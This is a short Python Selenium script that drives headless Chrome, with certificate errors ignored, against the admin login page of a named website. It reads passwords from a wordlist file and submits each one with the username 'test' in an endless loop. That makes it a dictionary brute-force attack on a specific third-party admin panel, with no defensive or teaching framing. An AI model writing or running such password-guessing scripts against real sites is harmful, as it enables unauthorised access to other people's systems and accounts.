# -*- coding=utf-8 -*-

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException
import time

chrome_path = './chromedriver'
chrome_options = Options()  # 创建chrome设置
chrome_options.add_argument('--ignore-certificate-errors')  # 无视证书引发的错误
chrome_options.add_argument('--headless')  # 无窗口模式
driver = webdriver.Chrome(executable_path=chrome_path, options=chrome_options)  # 配置chrome设置

driver.get('http://www.shutuiche.com/admin/login/index.html')
time.sleep(1)

keys = True
while keys is True:

    with open('./1pass01.txt', 'r') as f:
        dict_list = f.readlines()
        print(dict_list)
    for i in dict_list:
        time.sleep(0.2)
        print(i)
        driver.find_element_by_xpath('//*[@id="L_name"]').send_keys('test')
        driver.find_element_by_xpath('//*[@id="L_pass"]').send_keys(i)
        driver.find_element_by_xpath('//*[@id="form1"]/div[3]/button').click()
        driver.refresh()

driver.close()



